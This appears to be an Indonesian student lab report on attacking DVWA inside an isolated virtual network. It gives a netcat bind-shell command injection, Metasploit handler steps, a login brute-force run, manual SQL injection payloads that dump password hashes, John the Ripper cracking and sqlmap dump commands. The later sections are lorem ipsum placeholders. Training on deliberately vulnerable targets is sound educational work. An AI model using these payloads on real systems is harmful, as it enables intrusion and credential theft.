# Anggota Kelompok 9

1. 5114100031 ANDRE EXAUDI JEREMY RUMAPEA
2. 5114100043 JEFFRY NASRI FARUKI
3. 5114100073 HENDRA DARMAWAN

# Pendahuluan

Dalam laporan berisi cara penggunaan DVWA, Cuckoo dan Snort. DVWA adalah singkatan dari Damn Vulnerable Web Application, DVWA sendiri merupakan sebuah website yang sudah dirancang sedemikian rupa sehingga memiliki banyak celah keamanan untuk di explore. Cuckoo adalah sistem penganalisa malware. Snort adalah sistem penganalisa paket. Laporan ini akan berisi instalasi,konfigurasi dan beberapa seknario percobaan masing-masing aplikasi tersebut

# DVWA
Prerequisite:
1. Iso Backtrack 5 GNOME 64 bit
2. Iso Metasploitable-linux-2.0.0
3. Iso Ubuntu Dekstop 16.04
4. Windows 7/8/10
## Konfigurasi

1. Buat DHCP server pada VMWare dengan mengetikkan perintah berikut di cmd
```
VBoxManage dhcpserver add --netname intnet --ip 10.0.1.1 --netmask 255.255.255.0 --lowerip 10.0.1.100 --upperip 10.0.1.200  --enable
```
Ket = perintah di atas akan memberi ip address dalam rentang 10.0.1.100 sampai 10.0.1.200
2. Setting Network Virtual OS Metsploitable
Klik Kanan Virtual OS -> Setting -> Buka Tab Network -> isi Attached Netwrok : Internal Network dan Name : intnet(nama dhcp server Langkah 1)

Gambar 1

Jika Berhasil , maka akan didapatkan ip dalam rentang 10.0.1.100 sampai 10.0.1.200 :

Gambar 2

3. Lakukan Hal tersebut pada Virtual OS backtrack dan viertual OS ubuntu
4. Setting security DVWA menjadi Low
Buka ip Virtual OS metasploitable pada browser di virtual OS Ubuntu. contoh = 10.0.1.100/dvwa

Gambar 3

Login dengan username : admin , password : password

Gambar 4

Klik Tab DVWA Security, Pilih Low, SUBMIT

Gambar 5
## Testing
### Lesson 4: Using Metasploit with Command Execution

1. Jalankan Netcat pada Metasploit
Klik tab Command Execution

GAMbar 6

Jalankan perintah
```
http://10.0.1.100;mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe
```
Ket = 10.0.1.100 -> ip Metasploitable
GAMbar 7

2. Start VIrtual OS backtrack, login dengan username : root, password: toor
3. Buka start Menu ->BackTrack->Exploitation Tools->Network Exploitation tool->Metasploit Framework -> msf console
Gambar 8

4. Jalankan perintah-perintah berikut secara bergantian
```
use multi/handler
set PAYLOAD linux/x86/shell/bind_tcp
show options
set RHOST 10.0.1.100
```

5. Jalankan perintah 
```
exploit
```

### Lesson 5: Using Tamper Data with crack_web_form.pl

1. Enable add on Tamper Data pada firefox di Backtrack
GAmbar 9

2. Buka Halaman DVWA dengan firefox di Backtrack
3. Start Add on Tamper Data (Firefox->Tools->Tamper Data -> STart Tamper)

Gambar 10
4. Login dengan akun username : admin dan password : password pada halaman DVWA
5. AKan muncul notifikasi Sumbit tamper data. Uncheck textbox dan klik submit

Gambar 11

6. Copy data POSTDATA dalam REQUEST HEADER padasalah satu data yang method-nya POST

Gambar 12

7. copy data tersebut pada notepad
8. Login sekali lagi dengan username dan password yang salah
9. AKan muncul tulisan Login FAiled . masukkan tulisan ini pada notepad sebelumnya bersamaan dengan data POSTDATA
10. Buat direktory pentest/password/cwf
11. download http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson5/cwf.tar.gz , masukkan dalam folder tersebut
12. JALankan perintah-perintah berikut secara berurutan
```
    cd /pentest/passwords/cwf
    ls -l
    tar xovfz cwf.tar.gz
    chmod 700 crack_web_form.pl
```
13. Jalankan perintah :
```
./crack_web_form.pl -U admin -P password.txt -http "10.0.1.100/dvwa/login.php" -data "username=USERNAME&password=PASSWORD&Login=Login" -M "Login failed"
```
Ket: 10.0.1.100->IP metasploitable

Gambar 13
### Lesson 6: Manual SQL Injection, John the Ripper

1. Login KE DVWA. Buka menu SQL Injection
Gambar 14
2. Skenario Basic Injection
Masukkan perintah berikut di kolom SQL Injection
```
1
```
3. Skenario Always True
Masukkan perintah berikut di kolom SQL Injection
```
%' or '0'='0
```
4. Menampilkan versi Database
Masukkan perintah berikut di kolom SQL Injection
```
%' or 0=0 union select null, version() #
```
5. Menampilkan User Database 
Masukkan perintah berikut di kolom SQL Injection
```
%' or 0=0 union select null, user() #
```
6. Menampilkan Nama Database
Masukkan perintah berikut di kolom SQL Injection
```
%' or 0=0 union select null, database() #
```
7. Menampilkan semua tabel di information_schema
Masukkan perintah berikut di kolom SQL Injection
```
%' and 1=0 union select null, table_name from information_schema.tables #
```
8. Menampilkan semua pengguna di tabel information_schema
Masukkan perintah berikut di kolom SQL Injection
```
%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
```
9. Menmpilkan kolom di tabel information_schema
Masukkan perintah berikut di kolom SQL Injection
```
%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
```
10. Menampilkan kolom dan konten tabel di information_schema
Masukkan perintah berikut di kolom SQL Injection
```
%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
```
11. Membuat password hash file
Data yang didapatkan dari langkah ke-10 simpan di notepad taruh di folder /pentest/password/john dengan format seperti gambar di bawah

Gambar 15

Jalankan perintah berikut untuk mencrypt password yg terenkripsi
```
cd /pentest/passwords/john
./john --format=raw-MD5 dvwa_password.txt
```



### Lesson 7: Automate SQL Injection with SqlMap

1. Login ke DVWA dan buka menu SQL INjection
2. Start add On tamper data
3. MAsukkan angka 1 di kolom sql injection, maka akan muncul notifikasi submit. uncheck checkbox
Gambar16
4. Catat data REferrer dan data Cookiedari salah satu paket GET
GAMBAR 17
5. Buka folder SQLMAP pada terminal dengan mengetik
```
cd /pentest/web/scanners/sqlmap
```
6. Menggunakan sqlmap meandapatkan database dan user yang digunakan
```
/sqlmap.py -u "http://10.0.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=lpb5g4uss9kp70p8jccjeks621; security=low" -b --current-db --current-user
```
Ket : sesuaikan data dengan langkah ke 4

jika ada pemrtanyaan, pilih yes. Setelah proses selesai, hasilnya kan sepertin ini :

Gambar 18

Data tersebut merupakan database yang sedang digunakan

8. Menggunakan sqlmap untuk dapatkan semua database yang ada

Jalankan perintah :
```
./sqlmap.py -u "http://10.0.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=lpb5g4uss9kp70p8jccjeks621; security=low" --dbs
```
Ket : sesuaikan data dengan langkah ke 4

Jika berhasil maka akan seperti gambar di bawah ini :

Gambar 19

9. MEnggunakan sqlmap untuk dapatkan isi username dan password database DVWA
```
./sqlmap.py -u "http://10.0.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=lpb5g4uss9kp70p8jccjeks621; security=low" -D dvwa --tables
```
Ket : sesuaikan data dengan langkah ke 4

Gambar 20
Jalankan perintah :
```
./sqlmap.py -u "http://10.0.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=lpb5g4uss9kp70p8jccjeks621; security=low" -D dvwa -T users --columns
```
Ket : sesuaikan data dengan langkah ke 4
Gambar 21
Jalankan perintah :
```
./sqlmap.py -u "http://10.0.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=lpb5g4uss9kp70p8jccjeks621; security=low" -D dvwa -T users -C user,password --dump
```
Ket : sesuaikan data dengan langkah ke 4
Gambar 22
### Lesson 8: Upload PHP Backdoor Payload

"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."

### Lesson 9: Cross Site Scripting (XSS)

"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."

### Lesson 10: Cross Site Request Forgery combined with Curl

"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."

# CUCKOO
## Instalasi

"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."

## Konfigurasi

"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."

## Testing

"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."

# SNORT
## Instalasi

"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."

## Konfigurasi

"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."

## Testing

"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."

### membaca pcap dari SECREPO (Security Data Samples Repository)

"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."

# Refrensi
  * http://www.computersecuritystudent.com/cgi-bin/CSS/process_request_v3.pl?HID=688b0913be93a4d95daed400990c4745&TYPE=SUB
  
